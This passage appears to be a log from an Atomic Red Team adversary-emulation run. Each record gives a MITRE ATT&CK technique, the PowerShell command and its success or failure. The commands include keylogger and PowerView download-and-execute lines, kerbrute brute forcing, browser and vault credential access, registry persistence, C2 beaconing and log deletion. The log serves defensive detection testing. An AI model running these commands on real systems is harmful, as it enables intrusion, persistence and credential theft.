                      '"ReportingMode"; $Value = "1"; $SilentProcessExit = '
                      '"HKLM:\\SOFTWARE\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\SilentProcessExit\\whoami.exe"; '
                      'New-Item -Path $SilentProcessExit -Force; '
                      'New-ItemProperty -Path $SilentProcessExit -Name $Name '
                      '-Value $Value -PropertyType DWord -Force ; $Name = '
                      '"MonitorProcess"; $Value = "cmd.exe /c calc.exe"; '
                      'New-ItemProperty -Path $SilentProcessExit -Name $Name '
                      '-Value $Value -PropertyType String -Force; '
                      'Start-Process whoami.exe',
 'platform': 'windows',
 'run': '2023-12-01T20:44:56Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_001__defense-evasion__signed_binary_proxy_execution-_compiled_html_file__627f499ceb32e74b95494141bc680e08__trial_1

atomic_ordering: ['627f499ceb32e74b95494141bc680e08']
------------------------------
{'ability_id': '627f499ceb32e74b95494141bc680e08',
 'agent_reported_time': '2023-11-11T13:10:26Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.001',
            'technique_name': 'Signed Binary Proxy Execution: Compiled HTML '
                              'File'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Invoke-ATHCompiledHelp -ScriptEngine JScript '
            '-InfoTechStorageHandler its -TopicExtension html -HHFilePath '
            '$env:windir\\hh.exe -CHMFilePath Test.chm',
 'delegated': '2023-11-30T19:13:17Z',
 'description': 'Executes a CHM file with a defined script engine, ITS '
                'Protocol Handler, and help topic extension.',
 'executor': 'psh',
 'link_id': 'fbc097fc-9798-4ffb-bf7e-0182edefed04',
 'name': 'Invoke CHM with Script Engine and Help Topic',
 'pid': 2564,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  Invoke-ATHCompiledHelp '
                      '-ScriptEngine JScript -InfoTechStorageHandler its '
                      '-TopicExtension html -HHFilePath $env:windir\\hh.exe '
                      '-CHMFilePath Test.chm',
 'platform': 'windows',
 'run': '2023-11-30T19:14:19Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1110_001__credential-access__brute_force-_password_guessing__77e4fd90d211edf046c6c7092a4ed3af__trial_1

atomic_ordering: ['77e4fd90d211edf046c6c7092a4ed3af']
------------------------------
{'ability_id': '77e4fd90d211edf046c6c7092a4ed3af',
 'agent_reported_time': '2023-11-11T13:10:02Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1110.001',
            'technique_name': 'Brute Force: Password Guessing'},
 'command': 'cd "PathToAtomicsFolder\\..\\ExternalPayloads"; .\\kerbrute.exe '
            'bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain '
            '$env:temp\\bruteuser.txt TestUser1',
 'delegated': '2023-11-29T20:21:17Z',
 'description': "Bruteforce a single user's password from a wordlist\n",
 'executor': 'psh',
 'link_id': '3940d859-9623-41c5-94ba-b00f96d902b7',
 'name': 'Password Brute User using Kerbrute Tool',
 'pid': 7056,
 'plaintext_command': 'cd "PathToAtomicsFolder\\..\\ExternalPayloads"; '
                      '.\\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d '
                      '$ENV:userdomain $env:temp\\bruteuser.txt TestUser1',
 'platform': 'windows',
 'run': '2023-11-29T20:21:25Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__cb6e6c7e18aba2207c696368f8edb23a__trial_1

atomic_ordering: ['cb6e6c7e18aba2207c696368f8edb23a']
------------------------------
{'ability_id': 'cb6e6c7e18aba2207c696368f8edb23a',
 'agent_reported_time': '2023-11-11T13:10:31Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': 'New-ItemProperty '
            '"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE" -Name '
            'DisablePrivacyExperience -PropertyType DWord -Value 1 -Force',
 'delegated': '2023-12-03T13:26:25Z',
 'description': 'LockBit Black - Disable Privacy Settings Experience Using '
                'Registry\n',
 'executor': 'psh',
 'link_id': 'c87e04e8-8998-4e0c-accd-71c8c73b6553',
 'name': 'LockBit Black - Disable Privacy Settings Experience Using Registry '
         '-Powershell',
 'pid': 6424,
 'plaintext_command': 'New-ItemProperty '
                      '"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE" '
                      '-Name DisablePrivacyExperience -PropertyType DWord '
                      '-Value 1 -Force',
 'platform': 'windows',
 'run': '2023-12-03T13:27:06Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098_003__persistence__account_manipulation-_additional_cloud_roles__300411e901bb14245148885ad5e72882__trial_1

atomic_ordering: ['300411e901bb14245148885ad5e72882']
==============================
==============================
adversary_id: atomic__t1056_001__multiple__input_capture-_keylogging__a18a0e98b9566d92a1611a2da69b413b__trial_1

atomic_ordering: ['a18a0e98b9566d92a1611a2da69b413b']
------------------------------
{'ability_id': 'a18a0e98b9566d92a1611a2da69b413b',
 'agent_reported_time': '2023-11-11T13:10:27Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1056.001',
            'technique_name': 'Input Capture: Keylogging'},
 'command': 'if (Test-Path '
            '"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1") { ; } '
            'else {New-Item -ItemType Directory (Split-Path '
            '"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1") -Force '
            '| Out-Null; Invoke-WebRequest '
            'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 '
            '-OutFile '
            '"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1"};  ;  '
            '&"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1" '
            '-LogPath $env:TEMP\\key.log',
 'delegated': '2023-11-28T03:26:19Z',
 'description': 'Utilize PowerShell and external resource to capture '
                'keystrokes\n'
                '[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\n'
                'Provided by '
                '[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n'
                '\n'
                'Upon successful execution, Powershell will execute '
                '`Get-Keystrokes.ps1` and output to key.log.\n',
 'executor': 'psh',
 'link_id': 'd07b1533-ac78-4af4-a04b-d47c000c9755',
 'name': 'Input Capture',
 'pid': 9936,
 'plaintext_command': 'if (Test-Path '
                      '"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1") '
                      '{ ; } else {New-Item -ItemType Directory (Split-Path '
                      '"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1") '
                      '-Force | Out-Null; Invoke-WebRequest '
                      'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 '
                      '-OutFile '
                      '"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1"};  '
                      ';  '
                      '&"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1" '
                      '-LogPath $env:TEMP\\key.log',
 'platform': 'windows',
 'run': '2023-11-28T03:27:09Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1071_004__command-and-control__application_layer_protocol-_dns__08faa1ff79f2c8e48a2869a830c210f7__trial_1

atomic_ordering: ['08faa1ff79f2c8e48a2869a830c210f7']
------------------------------
{'ability_id': '08faa1ff79f2c8e48a2869a830c210f7',
 'agent_reported_time': '2023-11-11T13:09:59Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1071.004',
            'technique_name': 'Application Layer Protocol: DNS'},
 'command': 'Set-Location "PathToAtomicsFolder"; '
            '.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io '
            '-Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter '
            '20 -RunTime 30',
 'delegated': '2023-11-28T21:30:47Z',
 'description': 'This test simulates an infected host beaconing via DNS '
                'queries to a command and control server at regular intervals '
                'over time.\n'
                'This behaviour is typical of implants either in an idle state '
                'waiting for instructions or configured to use a low query '
                'volume over time to evade threshold based detection.\n'
                'A custom domain and sub-domain will need to be passed as '
                'input parameters for this test to work. Upon execution, DNS '
                'information about the domain will be displayed for each '
                'callout.\n',
 'executor': 'psh',
 'link_id': '37e9bcb0-7581-4fa2-8bc7-90524d094f1e',
 'name': 'DNS Regular Beaconing',
 'pid': 9672,
 'plaintext_command': 'Set-Location "PathToAtomicsFolder"; '
                      '.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain '
                      '127.0.0.1.nip.io -Subdomain atomicredteam -QueryType '
                      'TXT -C2Interval 30 -C2Jitter 20 -RunTime 30',
 'platform': 'windows',
 'run': '2023-11-28T21:30:51Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1572__command-and-control__protocol_tunneling__6e214f0f17e5d4988aa1085ad4291f46__trial_1

atomic_ordering: ['6e214f0f17e5d4988aa1085ad4291f46']
------------------------------
{'ability_id': '6e214f0f17e5d4988aa1085ad4291f46',
 'agent_reported_time': '2023-11-11T13:09:46Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1572',
            'technique_name': 'Protocol Tunneling'},
 'command': 'Set-Location "PathToAtomicsFolder"; '
            '.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer',
 'delegated': '2023-12-04T00:26:05Z',
 'description': 'This test simulates an infected host beaconing via DoH '
                'queries to a command and control server at regular intervals '
                'over time.\n'
                'This behaviour is typical of implants either in an idle state '
                'waiting for instructions or configured to use a low query '
                'volume over time to evade threshold based detection.\n'
                'A custom domain and sub-domain will need to be passed as '
                'input parameters for this test to work. Upon execution, DNS '
                'information about the domain will be displayed for each '
                'callout in a JSON format.\n',
 'executor': 'psh',
 'link_id': 'a0e3cc04-5f6f-4bcd-98f6-0bc6ad8a56fa',
 'name': 'DNS over HTTPS Regular Beaconing',
 'pid': 7752,
 'plaintext_command': 'Set-Location "PathToAtomicsFolder"; '
                      '.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer',
 'platform': 'windows',
 'run': '2023-12-04T00:26:11Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__5c23188ed301af9f1b6b55d4f3f60b46__trial_1

atomic_ordering: ['5c23188ed301af9f1b6b55d4f3f60b46']
------------------------------
{'ability_id': '5c23188ed301af9f1b6b55d4f3f60b46',
 'agent_reported_time': '2023-11-11T13:09:53Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.004',
            'technique_name': 'Boot or Logon Autostart Execution: Winlogon '
                              'Helper DLL'},
 'command': 'Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows '
            'NT\\CurrentVersion\\Winlogon\\" "Userinit" "Userinit.exe, '
            'C:\\Windows\\System32\\cmd.exe" -Force',
 'delegated': '2023-12-02T05:02:49Z',
 'description': 'PowerShell code to set Winlogon userinit key to execute a '
                'binary at logon along with userinit.exe.\n'
                '\n'
                'Upon successful execution, PowerShell will modify a registry '
                'value to execute cmd.exe upon logon/logoff.\n',
 'executor': 'psh',
 'link_id': '5e6991c4-c0ac-4c5b-a868-dc88013f49e0',
 'name': 'Winlogon Userinit Key Persistence - PowerShell',
 'pid': 9672,
 'plaintext_command': 'Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Winlogon\\" "Userinit" '
                      '"Userinit.exe, C:\\Windows\\System32\\cmd.exe" -Force',
 'platform': 'windows',
 'run': '2023-12-02T05:02:59Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1090_003__command-and-control__proxy-_multi-hop_proxy__2f4c11504a21b8771b725a3e469fd74b__trial_1

atomic_ordering: ['2f4c11504a21b8771b725a3e469fd74b']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_005__execution__command_and_scripting_interpreter-_visual_basic__9c955a373154a7090d4b4396b561f5da__trial_1

atomic_ordering: ['9c955a373154a7090d4b4396b561f5da']
------------------------------
{'ability_id': '9c955a373154a7090d4b4396b561f5da',
 'agent_reported_time': '2023-11-11T13:10:05Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.005',
            'technique_name': 'Command and Scripting Interpreter: Visual '
                              'Basic'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing); Invoke-Maldoc -macroFile '
            '"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt" '
            '-officeProduct "Word" -sub "Exec"',
 'delegated': '2023-11-28T10:51:09Z',
 'description': 'This module takes an encoded VBS script and executes it from '
                'within a malicious document. By default, upon successful '
                'execution\n'
                'a message box will pop up displaying "ART T1059.005"\n'
                '\n'
                'A note regarding this module, due to the way that this module '
                'utilizes "ScriptControl" a 64bit version of Microsoft Office '
                'is required.\n'
                'You can validate this by opening WinWord -> File -> Account '
                '-> About Word\n',
 'executor': 'psh',
 'link_id': '6d9f06e3-5ee8-4eee-9f98-aedceef5dd98',
 'name': 'Encoded VBS code execution',
 'pid': 10300,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing); Invoke-Maldoc -macroFile '
                      '"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt" '
                      '-officeProduct "Word" -sub "Exec"',
 'platform': 'windows',
 'run': '2023-11-28T10:51:31Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1574_011__multiple__hijack_execution_flow-_services_registry_permissions_weakness__6d3a92f7fc3d8abeea37531cfba7c79e__trial_1

atomic_ordering: ['6d3a92f7fc3d8abeea37531cfba7c79e']
------------------------------
{'ability_id': '6d3a92f7fc3d8abeea37531cfba7c79e',
 'agent_reported_time': '2023-11-11T13:09:46Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1574.011',
            'technique_name': 'Hijack Execution Flow: Services Registry '
                              'Permissions Weakness'},
 'command': 'get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* '
            '|FL; get-acl '
            'REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename '
            '|FL',
 'delegated': '2023-12-04T01:41:14Z',
 'description': 'Service registry permissions weakness check and then which '
                'can lead to privilege escalation with ImagePath. eg.\n'
                'reg add '
                '"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}" '
                '/f /v ImagePath /d "C:\\temp\\AtomicRedteam.exe"\n',
 'executor': 'psh',
 'link_id': '1b2dd9a3-9632-4d28-a28d-1f610b816897',
 'name': 'Service Registry Permissions Weakness',
 'pid': 8720,
 'plaintext_command': 'get-acl '
                      'REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* '
                      '|FL; get-acl '
                      'REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename '
                      '|FL',
 'platform': 'windows',
 'run': '2023-12-04T01:42:50Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__b0026f9a57639c049490a43d623d7695__trial_1

atomic_ordering: ['b0026f9a57639c049490a43d623d7695']
------------------------------
{'ability_id': 'b0026f9a57639c049490a43d623d7695',
 'agent_reported_time': '2023-11-11T13:10:16Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.004',
            'technique_name': 'Indicator Removal on Host: File Deletion'},
 'command': 'New-Item -Path $env:TEMP\\TeamViewer_54.log -Force | Out-Null; '
            'Remove-Item $env:TEMP\\TeamViewer_54.log -Force -ErrorAction '
            'Ignore',
 'delegated': '2023-11-28T18:16:05Z',
 'description': 'Adversaries may delete TeamViewer log files to hide activity. '
                'This should provide a high true-positive alert ration.\n'
                'This test just places the files in a non-TeamViewer folder, a '
                'detection would just check for a deletion event matching the '
                'TeamViewer\n'
                'log file format of TeamViewer_##.log. Upon execution, no '
                'output will be displayed. Use File Explorer to verify the '
                'folder was deleted.\n'
                '\n'
                'https://twitter.com/SBousseaden/status/1197524463304290305?s=20\n',
 'executor': 'psh',
 'link_id': '2d3336e7-1f25-4e37-9373-c6c361ece84a',
 'name': 'Delete TeamViewer Log Files',
 'pid': 7136,
 'plaintext_command': 'New-Item -Path $env:TEMP\\TeamViewer_54.log -Force | '
                      'Out-Null; Remove-Item $env:TEMP\\TeamViewer_54.log '
                      '-Force -ErrorAction Ignore',
 'platform': 'windows',
 'run': '2023-11-28T18:16:42Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__679ef375ad2b361965500392419d084c__trial_1

atomic_ordering: ['679ef375ad2b361965500392419d084c']
------------------------------
{'ability_id': '679ef375ad2b361965500392419d084c',
 'agent_reported_time': '2023-11-11T13:10:22Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555.003',
            'technique_name': 'Credentials from Password Stores: Credentials '
                              'from Web Browsers'},
 'command': 'Copy-Item "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\" '
            '-Destination "PathToAtomicsFolder\\..\\ExternalPayloads" -Force '
            '-Recurse',
 'delegated': '2023-12-02T22:52:56Z',
 'description': 'Simulates an adversary accessing encrypted credentials from '
                "firefox web browser's login database.\n"
                'more info in '
                'https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n',
 'executor': 'psh',
 'link_id': 'a7b6bdb9-5a70-4e37-9bb3-a01d535918c2',
 'name': 'Simulating access to Windows Firefox Login Data',
 'pid': 1844,
 'plaintext_command': 'Copy-Item "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\" '
                      '-Destination '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads" -Force '
                      '-Recurse',
 'platform': 'windows',
 'run': '2023-12-02T22:53:25Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555__credential-access__credentials_from_password_stores__6bbb6f8b1db42e2c2c79892e8c31feb3__trial_1

atomic_ordering: ['6bbb6f8b1db42e2c2c79892e8c31feb3']
------------------------------
{'ability_id': '6bbb6f8b1db42e2c2c79892e8c31feb3',
 'agent_reported_time': '2023-11-11T13:10:21Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555',
            'technique_name': 'Credentials from Password Stores'},
 'command': 'vaultcmd /listcreds:"Windows Credentials" /all',
 'delegated': '2023-12-03T01:48:37Z',
 'description': 'This module will enumerate credentials stored in Windows '
                'Credentials vault of Windows Credential Manager using builtin '
                'utility vaultcmd.exe',
 'executor': 'psh',
 'link_id': '31fbf22e-575a-4726-a6ce-2de4407b3a36',
 'name': 'Enumerate credentials from Windows Credential Manager using '
         'vaultcmd.exe [Windows Credentials]',
 'pid': 8972,
 'plaintext_command': 'vaultcmd /listcreds:"Windows Credentials" /all',
 'platform': 'windows',
 'run': '2023-12-03T01:49:32Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1113__collection__screen_capture__582871bcbf9a88caed89ae25d76d018c__trial_1

atomic_ordering: ['582871bcbf9a88caed89ae25d76d018c']
------------------------------
{'ability_id': '582871bcbf9a88caed89ae25d76d018c',
 'agent_reported_time': '2023-11-11T13:09:52Z',
 'attack': {'tactic': 'collection',
            'technique_id': 'T1113',
            'technique_name': 'Screen Capture'},
 'command': 'cmd /c start /b psr.exe /start /output '
            'c:\\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12; Add-Type '
            '-MemberDefinition \'[DllImport("user32.dll")] public static '
            'extern void mouse_event(int flags, int dx, int dy, int cButtons, '
            "int info);' -Name U32 -Namespace W; [W.U32]::mouse_event(0x02 "
            '-bor 0x04 -bor 0x01, 0, 0, 0, 0); cmd /c "timeout 5 > NULL && '
            'psr.exe /stop"',
 'delegated': '2023-11-30T01:31:14Z',
 'description': 'Use Psr.exe binary to collect screenshots of user display. '
                'Test will do left mouse click to simulate user behaviour\n',
 'executor': 'psh',
 'link_id': 'c9719f4d-8359-41b7-9dd6-267195f49a41',
 'name': 'Windows Screencapture',
 'pid': 7444,
 'plaintext_command': 'cmd /c start /b psr.exe /start /output '
                      'c:\\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12; '
                      'Add-Type -MemberDefinition \'[DllImport("user32.dll")] '
                      'public static extern void mouse_event(int flags, int '
                      "dx, int dy, int cButtons, int info);' -Name U32 "
                      '-Namespace W; [W.U32]::mouse_event(0x02 -bor 0x04 -bor '
                      '0x01, 0, 0, 0, 0); cmd /c "timeout 5 > NULL && psr.exe '
                      '/stop"',
 'platform': 'windows',
 'run': '2023-11-30T01:31:28Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1087_002__discovery__account_discovery-_domain_account__c84a57391dbc724dc51436deb3e0ca00__trial_1

atomic_ordering: ['c84a57391dbc724dc51436deb3e0ca00']
------------------------------
{'ability_id': 'c84a57391dbc724dc51436deb3e0ca00',
 'agent_reported_time': '2023-11-11T13:09:59Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1087.002',
            'technique_name': 'Account Discovery: Domain Account'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' "
            '-UseBasicParsing); Get-DomainUser -verbose',
 'delegated': '2023-11-29T08:09:04Z',
 'description': 'Utilizing PowerView, run Get-DomainUser to identify the '
                'domain users. Upon execution, Users within the domain will be '
                'listed.\n',
 'executor': 'psh',
 'link_id': 'ababe05e-2fbe-4f68-b7a9-3e29625bfe68',
 'name': 'Get-DomainUser with PowerView',
 'pid': 11088,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' "
                      '-UseBasicParsing); Get-DomainUser -verbose',
 'platform': 'windows',
 'run': '2023-11-29T08:09:25Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__48a861eb5802bd7abdaa64b4fcd30924__trial_1

atomic_ordering: ['48a861eb5802bd7abdaa64b4fcd30924']
------------------------------
{'ability_id': '48a861eb5802bd7abdaa64b4fcd30924',
 'agent_reported_time': '2023-11-11T13:09:56Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.001',
            'technique_name': 'Command and Scripting Interpreter: PowerShell'},
 'command': 'if(2 -in $PSVersionTable.PSCompatibleVersions.Major) { ; } else '
            '{Write-Host  Automated installer not implemented yet, please '
            'install PowerShell v2 manually};  ;  powershell.exe -version 2 '
            '-Command Write-Host $PSVersion',
 'delegated': '2023-11-28T06:02:08Z',
 'description': 'This test requires the manual installation of PowerShell V2.\n'
                '\n'
                'Attempts to run powershell commands in version 2.0 '
                'https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n',
 'executor': 'psh',
 'link_id': 'b8c81eef-3029-40ac-bf01-f20b0bc5e5a5',
 'name': 'PowerShell Downgrade Attack',
 'pid': 7136,
 'plaintext_command': 'if(2 -in $PSVersionTable.PSCompatibleVersions.Major) { '
                      '; } else {Write-Host  Automated installer not '
                      'implemented yet, please install PowerShell v2 '
                      'manually};  ;  powershell.exe -version 2 -Command '
                      'Write-Host $PSVersion',
 'platform': 'windows',
 'run': '2023-11-28T06:02:14Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1069_001__discovery__permission_groups_discovery-_local_groups__608e19b5f7e210ba73e207289e5a1314__trial_1

atomic_ordering: ['608e19b5f7e210ba73e207289e5a1314']
------------------------------
{'ability_id': '608e19b5f7e210ba73e207289e5a1314',
 'agent_reported_time': '2023-11-11T13:10:11Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1069.001',
            'technique_name': 'Permission Groups Discovery: Local Groups'},
 'command': 'New-Item -Path "$env:TEMP\\SharpHound\\" -ItemType Directory > '
            '$null; & '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.exe" -d '
            '"$env:UserDnsDomain" --CollectionMethod LocalAdmin --NoSaveCache '
            '--OutputDirectory "$env:TEMP\\SharpHound\\"',
 'delegated': '2023-11-28T11:29:59Z',
 'description': 'This module runs the Windows executable of SharpHound in '
                'order to remotely list members of the local Administrators '
                'group (SAMR)\n',
 'executor': 'psh',
 'link_id': '043f8227-6217-4fa9-9d3d-77998436f3ec',
 'name': 'SharpHound3 - LocalAdmin',
 'pid': 10924,
 'plaintext_command': 'New-Item -Path "$env:TEMP\\SharpHound\\" -ItemType '
                      'Directory > $null; & '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.exe" '
                      '-d "$env:UserDnsDomain" --CollectionMethod LocalAdmin '
                      '--NoSaveCache --OutputDirectory '
                      '"$env:TEMP\\SharpHound\\"',
 'platform': 'windows',
 'run': '2023-11-28T11:30:30Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098__persistence__account_manipulation__0690e0818b5749092595a472831f362f__trial_1

atomic_ordering: ['0690e0818b5749092595a472831f362f']
------------------------------
{'ability_id': '0690e0818b5749092595a472831f362f',
 'agent_reported_time': '2023-11-11T13:09:48Z',
 'attack': {'tactic': 'persistence',
            'technique_id': 'T1098',
            'technique_name': 'Account Manipulation'},
 'command': 'if (Test-Path '
            '$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else '
            '{New-Item -Type Directory (split-path '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") '
            '-ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  '
            '$env:USERNAME -message "Enter password for $env:USERNAME to use '
            'during password change attempt"; $cred.Password | '
            'ConvertFrom-SecureString | Out-File '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  ;  '
            '$credFile = '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; if '
            '(Test-Path $credFile) {;     $cred = New-Object -TypeName '
            'System.Management.Automation.PSCredential -ArgumentList '
            '$env:USERNAME, (Get-Content $credFile | '
            'ConvertTo-SecureString);     '
            'if($cred.GetNetworkCredential().Password -eq '
            '"UPPER-LONG-SPECIAL-333"){;       Write-Host -ForegroundColor '
            'Yellow "The new password is the same as the password stored in '
            'the credential file. Please specify a different new password."; '
            'exit -1;     };     try {;         $newPassword = '
            'ConvertTo-SecureString UPPER-LONG-SPECIAL-333 -AsPlainText '
            '-Force;         Set-ADAccountPassword -Identity $env:USERNAME '
            '-OldPassword $cred.password -NewPassword $newPassword;     };     '
            'catch { ;         $_.Exception;         $errCode = '
            '$_.Exception.ErrorCode;         Write-Host "Error code: '
            '$errCode";         if ($errCode -eq 86) {;             Write-Host '
            '-ForegroundColor Yellow "The stored password for the current user '
            'is incorrect. Please run the prereq commands to set the correct '
            'credentials";             Remove-Item $credFile;         '
            '};         exit $errCode;     };     Write-Host -ForegroundColor '
            'Cyan "Successfully changed the password to '
            'UPPER-LONG-SPECIAL-333";     $newCred = New-Object '
            'System.Management.Automation.PSCredential ($env:USERNAME, '
            '$(ConvertTo-SecureString "UPPER-LONG-SPECIAL-333" -AsPlainText '
            '-Force));     $newCred.Password | ConvertFrom-SecureString | '
            'Out-File $credFile; }; else {;     Write-Host -ForegroundColor '
            'Yellow "You must store the password of the current user by '
            'running the prerequisite commands first"; }',
 'delegated': '2023-11-29T12:57:57Z',
 'description': 'Attempt to change the password of the current domain user in '
                'order to check password policy. Ideally, you would only run '
                'this atomic test to verify that your password policy is '
                'blocking the use of the new password.\n'
                'If the password is succesfully changed to the new password, '
                'the credential file will be updated to reflect the new '
                'password. You can then run the atomic manually and specify a '
                'new password of your choosing, however the\n'
                'password policy will likely prevent you from setting the '
                'password back to what it was. \n',
 'executor': 'psh',
 'link_id': '97f3577f-06ef-49dc-97a8-503dfd630dc1',
 'name': 'Domain Password Policy Check: No Lowercase Character in Password',
 'pid': 7192,
 'plaintext_command': 'if (Test-Path '
                      '$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { '
                      '; } else {New-Item -Type Directory (split-path '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") '
                      '-ErrorAction Ignore | Out-Null; $cred = Get-Credential '
                      '-UserName  $env:USERNAME -message "Enter password for '
                      '$env:USERNAME to use during password change attempt"; '
                      '$cred.Password | ConvertFrom-SecureString | Out-File '
